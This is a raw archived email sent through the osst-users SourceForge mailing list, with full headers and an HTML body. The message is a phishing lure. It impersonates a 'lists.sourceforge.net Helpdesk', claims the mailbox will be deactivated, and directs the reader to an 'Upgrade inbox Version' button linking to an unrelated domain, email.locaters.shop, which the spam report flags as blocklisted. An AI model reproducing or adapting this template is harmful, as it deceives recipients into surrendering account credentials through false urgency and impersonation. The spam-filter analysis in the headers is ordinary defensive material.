Return-Path: <osst-users-bounces@lists.sourceforge.net>
X-Original-To: lists+osst-users@lfdr.de
Delivered-To: lists+osst-users@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 5E899870131
	for <lists+osst-users@lfdr.de>; Mon,  4 Mar 2024 13:26:35 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <osst-users-bounces@lists.sourceforge.net>)
	id 1rh7Os-0000wp-5r
	for lists+osst-users@lfdr.de;
	Mon, 04 Mar 2024 12:26:34 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <no-reply1@amenergy.in>) id 1rh7Oq-0000wM-5Q
 for osst-users@lists.sourceforge.net; Mon, 04 Mar 2024 12:26:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=V+B8Q3KJgCLs4BleRFoP3r5a+5u6GOecxtE+lgIiBZc=; b=lqgzy6Dd0N83vwuIFOGvBE99ET
 aSGw75YPzAs6eAjCo4HGaSbSH4qaoK4k/WhCMqHkw7trTldJXQungV+bGLkI3us2cwBXChWr187U4
 MEjs0aVh43qPAsX2maftYT7cN8pBgp/uQcyc4CI6mcJO2OfqXTo+BzWgkS+0IISA3BX4=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=V+B8Q3KJgCLs4BleRFoP3r5a+5u6GOecxtE+lgIiBZc=; b=Y
 XL8GMgr5mRQt2w6bej0hWf8VQfhp2D8yrAIWEASUQ2c5i4VEphgkOT67+Bri2Q//4HkCYga30R0tc
 w8pZWCOsIRcU6SGLh2bKVZbW+FPTjtjGqkeu9cxDd6NLYGM0rHVueukNPQNyUy9K9tQxe/CvPOe/y
 Wo7S5rho+AaeL7tY=;
Received: from jka0.amenergy.in ([89.150.57.50])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.95)
 id 1rh7Oj-0000MG-Bo for osst-users@lists.sourceforge.net;
 Mon, 04 Mar 2024 12:26:32 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default; d=amenergy.in;
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=no-reply1@amenergy.in;
 bh=V+B8Q3KJgCLs4BleRFoP3r5a+5u6GOecxtE+lgIiBZc=;
 b=gDU1dkd6vtODnbKdH6hrHWqQH3QAuUy/lSct9oKBcmUa9LzxL1fUA1OvbzesR2XTN7Iso7z0R6hF
 ecLReNtP4soC5kxrPRrfYteKKiMI4I5alJ3Qj7H/9wIAEzNWkppTkJp7EGTKYocC4OzEhsczJ2Tm
 SPbuy/h9iypqLkUnnRg=
To: osst-users@lists.sourceforge.net
Date: 4 Mar 2024 13:09:34 +0100
Message-ID: <20240304130934.4B81F0FDAAE79337@amenergy.in>
MIME-Version: 1.0
X-Spam-Score: 4.1 (++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Dear osst-users, We are deactivating all mailbox users that
 are still using the old version of the lists.sourceforge.net mailbox. Your
 email ***( osst-users@lists.sourceforge.net )*** is still using this old
 version. Please tap the blue button below to upgrade to the latest version
 and get 105GB Free Space. 
 Content analysis details:   (4.1 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: locaters.shop]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
 envelope-from domain
 -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
 author's domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 2.0 PYZOR_CHECK            Listed in Pyzor
 (https://pyzor.readthedocs.io/en/latest/)
 -0.0 T_SCC_BODY_TEXT_LINE   No description available.
 0.1 FSL_BULK_SIG           Bulk signature with no Unsubscribe
 0.0 PDS_FROM_NAME_TO_DOMAIN From:name looks like To:domain
 0.2 PDS_FRNOM_TODOM_NAKED_TO Naked to From name equals to Domain
X-Headers-End: 1rh7Oj-0000MG-Bo
Subject: [Osst-users] FINAL NOTIFICATION: osst-users@lists.sourceforge.net
 Deactivation Notice!!
X-BeenThere: osst-users@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <osst-users.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=osst-users>
List-Post: <mailto:osst-users@lists.sourceforge.net>
List-Help: <mailto:osst-users-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/osst-users>,
 <mailto:osst-users-request@lists.sourceforge.net?subject=subscribe>
From: "lists.sourceforge.net Helpdesk via Osst-users"
 <osst-users@lists.sourceforge.net>
Reply-To: "lists.sourceforge.net Helpdesk" <no-reply1@amenergy.in>
Content-Type: multipart/mixed; boundary="===============7749388420494771302=="
Errors-To: osst-users-bounces@lists.sourceforge.net

--===============7749388420494771302==
Content-Type: text/html
Content-Transfer-Encoding: quoted-printable

<html><head>
<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.10570.1001">
<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
</head>
<body>
<h3 style=3D"color: rgb(0, 0, 0); text-transform: none; line-height: normal=
; text-indent: 0px; letter-spacing: normal; font-family: Arial, sans-serif;=
 font-style: normal; word-spacing: 0px; white-space: normal; orphans: 2; wi=
dows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit=
-text-stroke-width: 0px; text-decoration-thickness: initial; text-decoratio=
n-style: initial; text-decoration-color: initial;"><strong style=3D"line-he=
ight: normal; font-weight: bold;">
<span style=3D"color: rgb(102, 102, 102); line-height: normal;"><span style=
=3D"line-height: normal; vertical-align: inherit;"><span style=3D"line-heig=
ht: normal; vertical-align: inherit;"><span style=3D'line-height: normal; f=
ont-family: "Agency FB";'>Dear&nbsp;osst-users,</span></span></span></span>=
</strong></h3>
<p style=3D'margin: 1em 0px; color: rgb(0, 0, 0); text-transform: none; lin=
e-height: normal; text-indent: 0px; letter-spacing: normal; font-family: -a=
pple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, C=
antarell, "Helvetica Neue", sans-serif; font-size: 14px; font-style: normal=
; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wid=
ows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'><=
span style=3D"color: rgb(102, 102, 102); line-height: normal; font-family: =
Arial, sans-serif; font-size: 12px;">We are&nbsp;deactivating all mailbox u=
sers that are still using the old version of &nbsp;the&nbsp;</span><span>&n=
bsp;lists.sourceforge.net </span><span style=3D"color: rgb(102, 102, 102); =
line-height: normal; font-family: Arial, sans-serif; font-size: 12px;">mail=
box.</span>
<br style=3D"color: rgb(0, 0, 0); line-height: normal; font-family: Arial, =
sans-serif; font-size: 12px;"><br style=3D"color: rgb(0, 0, 0); line-height=
: normal; font-family: Arial, sans-serif; font-size: 12px;"><span style=3D"=
color: rgb(102, 102, 102); line-height: normal; font-family: Arial, sans-se=
rif; font-size: 12px;">Your email&nbsp;</span><span style=3D"color: rgb(102=
, 102, 102); line-height: normal; font-family: Arial, sans-serif; font-size=
: 12px; font-weight: bold;">
<span style=3D"line-height: normal; vertical-align: inherit;">&nbsp;***<spa=
n style=3D"line-height: normal; vertical-align: inherit;">(<a style=3D"line=
-height: normal; text-decoration: underline; cursor: pointer;" href=3D"http=
s://email.locaters.shop/communications.aspx?more=3Dosst-users@lists.sourcef=
orge.net" target=3D"_blank" rel=3D"noreferrer nofollow noopener"> osst-user=
s@lists.sourceforge.net&nbsp;</a></span></span><span style=3D"line-height: =
normal; vertical-align: inherit;"><span style=3D"line-height: normal; verti=
cal-align: inherit;">)***</span>
</span>
</span><span>&nbsp;</span><span style=3D"color: rgb(102, 102, 102); line-he=
ight: normal; font-family: Arial, sans-serif; font-size: 12px;">is still us=
ing this old version. Please tap the blue button below to upgrade to the la=
test version and get 105GB Free Space.</span><br style=3D"color: rgb(0, 0, =
0); line-height: normal; font-family: Arial, sans-serif; font-size: 12px;">=
<br style=3D"color: rgb(0, 0, 0); line-height: normal; font-family: Arial, =
sans-serif; font-size: 12px;">
<span style=3D"color: rgb(0, 0, 0); line-height: normal; font-family: Arial=
, sans-serif; font-size: 12px; font-weight: bold;"><span style=3D"color: rg=
b(0, 0, 0); line-height: normal;"><span style=3D"line-height: normal; verti=
cal-align: inherit;"><span style=3D"line-height: normal; vertical-align: in=
herit;">NOTE</span></span></span><span style=3D"color: rgb(102, 102, 102); =
line-height: normal;"><span style=3D"line-height: normal; vertical-align: i=
nherit;">
<span style=3D"line-height: normal; vertical-align: inherit;">
:</span></span></span><span>&nbsp;</span></span><span style=3D"color: rgb(1=
02, 102, 102); line-height: normal; font-family: Arial, sans-serif; font-si=
ze: 12px;">&nbsp;Failure to do this would lead to account deactivation.</sp=
an></p>
<span style=3D'color: rgb(0, 0, 0); text-transform: none; line-height: norm=
al; text-indent: 0px; letter-spacing: normal; font-family: -apple-system, B=
linkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Hel=
vetica Neue", sans-serif; font-size: 14px; font-style: normal; font-weight:=
 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-v=
ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
dth: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;'></span>
<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
 letter-spacing: normal; font-family: -apple-system, BlinkMacSystemFont, "S=
egoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-se=
rif; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0=
px; float: none; display: inline !important; white-space: normal; orphans: =
2; widows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -w=
ebkit-text-stroke-width: 0px;=20
text-decoration-thickness: initial; text-decoration-style: initial; text-de=
coration-color: initial;'></span>
<ul style=3D"margin: 0px; padding: 0px 0px 0px 2em; color: rgb(0, 0, 0); te=
xt-transform: none; line-height: normal; text-indent: 0px; letter-spacing: =
normal; font-family: Arial, sans-serif; font-size: 12px; font-style: normal=
; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wid=
ows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness: initial; text-decoration=
-style: initial; text-decoration-color: initial;">
<li style=3D"line-height: normal; margin-left: 15px;"><span style=3D"color:=
 rgb(0, 0, 0); line-height: normal;">Follow&nbsp;below to upgrade and keep =
your account active.</span></li></ul>
<p style=3D'margin: 1em 0px; color: rgb(0, 0, 0); text-transform: none; lin=
e-height: normal; text-indent: 0px; letter-spacing: normal; font-family: -a=
pple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, C=
antarell, "Helvetica Neue", sans-serif; font-size: 14px; font-style: normal=
; font-weight: 400; word-spacing: 0px; white-space: normal; orphans: 2; wid=
ows: 2; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-=
text-stroke-width: 0px; text-decoration-thickness:=20
initial; text-decoration-style: initial; text-decoration-color: initial;'><=
span style=3D"color: rgb(0, 0, 0); line-height: normal; font-family: Arial,=
 sans-serif; font-size: 12px;"></span><span style=3D"color: rgb(0, 0, 0); l=
ine-height: normal; font-family: Arial, sans-serif; font-size: medium;"><sp=
an style=3D"color: rgb(32, 31, 30); line-height: normal;"><span style=3D"li=
ne-height: normal;"></span></span></span>&nbsp;</p>
<p style=3D"margin: 6px 0px; color: rgb(0, 0, 0); text-transform: none; lin=
e-height: normal; text-indent: 0px; letter-spacing: normal; font-family: Ar=
ial, sans-serif; font-size: 15px; font-style: normal; font-weight: 400; wor=
d-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-variant-li=
gatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: 0px;=
 text-decoration-thickness: initial; text-decoration-style: initial; text-d=
ecoration-color: initial;">
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nb=
sp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&n=
bsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp=
;&nbsp;<a title=3D"Listen and Review" style=3D"background: 0% 50% rgb(0, 12=
0, 215); border-width: 0px; margin: 0px; padding: 10px 40px; color: white; =
line-height: normal; text-decoration: underline;=20
vertical-align: baseline; cursor: pointer;" href=3D"https://email.locaters.=
shop/communications.aspx?more=3Dosst-users@lists.sourceforge.net" target=3D=
"_blank" rel=3D"noreferrer nofollow noopener"><span style=3D"line-height: n=
ormal; vertical-align: inherit;">Upgrade inbox Version&nbsp;</span></a></p>=

<p style=3D"margin: 0in 0in 0pt; color: rgb(0, 0, 0); text-transform: none;=
 line-height: normal; text-indent: 0px; letter-spacing: normal; font-family=
: Arial, sans-serif; font-size: 12px; font-style: normal; font-weight: 400;=
 word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; font-varian=
t-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-width: =
0px; text-decoration-thickness: initial; text-decoration-style: initial; te=
xt-decoration-color: initial;">
<br style=3D"line-height: normal;"><br style=3D"line-height: normal;"><br s=
tyle=3D"line-height: normal;"><strong style=3D"line-height: normal; font-we=
ight: bold;"><span style=3D"line-height: normal; vertical-align: inherit;">=
<span style=3D"line-height: normal; vertical-align: inherit;">Connected to&=
nbsp;Mail-Portal&nbsp;&nbsp;&nbsp;&nbsp;</span></span><br style=3D"line-hei=
ght: normal;"><span style=3D"line-height: normal; vertical-align: inherit;"=
><span style=3D"line-height: normal; vertical-align: inherit;">
&copy; 2024&nbsp; Corporation. All rights reserved.</span></span></strong><=
/p></body></html>


--===============7749388420494771302==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============7749388420494771302==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Osst-users mailing list
Osst-users@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/osst-users

--===============7749388420494771302==--
